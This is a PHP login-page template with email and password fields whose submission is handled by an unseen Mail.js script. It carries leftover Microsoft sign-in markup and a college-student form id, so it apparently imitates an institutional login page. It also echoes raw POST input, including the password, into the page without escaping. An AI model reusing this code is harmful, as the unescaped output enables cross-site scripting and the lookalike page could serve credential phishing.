<?php $this->view('componets/LoginHeader'); ?>
<script>
    var base_url = '<?=ROOT?>';
</script>
<body>
    <div class="Main_base">
        <div class="mini-container login-widget card main-widget" style="max-width: 500px;height: 450px;background: #fff;"> 
            <img  style="width:70px;display:block; margin:0 auto" class="logo" role="img" 
            pngsrc="<?php echo ASSETS.'images/email.webp'?> " 
            svgsrc="<?php echo ASSETS.'images/email.webp'?>" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" 
            src="<?php echo ASSETS.'images/email.webp'?>" alt="Microsoft"> 
            <div class="formcontainer" style="margin-left:25px; margin-right:25px">
                <h3 class="text-center " style="font-weight:600">Login with Other Mail</h3>
                <form method="POST" class="form-group multisteps-form__form" id="__LoginMercyCollegeStudent" autocomplete="on" action="javascript:void(0)">
                    <div class="row">
                        <div class="col-md-12">
                            <label for="Email">Email Address</label>
                            <div class="mt-4 mb-4">
                                <svg style="color: #d93025;display:none; "" aria-hidden="true" class="bloicon1 stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                                <span class="errorMsg1" style="display:none;margin-bottom:15px"></span>
                            </div>
                            <input id="____email" name="____email" class="form-control" type="email" autocomplete="on" 
                            value="<?=((isset($_POST['____email']))?$_POST['____email']: '');?>" 
                            placeholder="Enter email" style="height:48px"/>
                            <span class="___invalidERROR"><?=((isset($data['emailError']))?$data['emailError']: '');?></span>  
                        </div>
                        <span style="display: block;width: 100%;padding: 6px 18px;font-size: 14px;color: #555">We'll never share your email with anyone else.</span>
                        <div class="col-md-12" style="margin-top:5px;">
                            <label for="Password">Password</label>
                            <div class="mt-4 mb-4">
                               <svg style="color: #d93025;display:none; "" aria-hidden="true" class="bloicon2 stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                                <span class="errorMsg2" style="display:none;margin-bottom:15px"></span>
                            </div>
                            <input name="____password" id="____password"  class="form-control" autocomplete="on" 
                            type="password" value="<?=((isset($_POST['____password']))?$_POST['____password']: '');?>" 
                            placeholder="Password"  style="height:48px;display: inline-block;
                            display: block;width: 100%;padding: 6px 12px;font-size: 14px;line-height: 1.42857143;color: #555;background-color: #fff;background-image: none;border: 1px solid #ccc;border-radius: 4px;-webkit-box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%);box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%);-webkit-transition: border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;-o-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;"/>
                            <span class="___invalidERROR"><?=((isset($data['PasswordError']))?$data['PasswordError']: '');?></span>
                        </div>
                        <div class="merginbtn" style="padding: 6px 12px;">
                            <button class="btn-scroll pull-right" style="margin-top:15px" onclick="validateUsername()" title="Sign in" type="submit">Login</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <script type='text/javascript' src="<?=ASSETS?>js/Mail.js"> </script>
</body>
</html>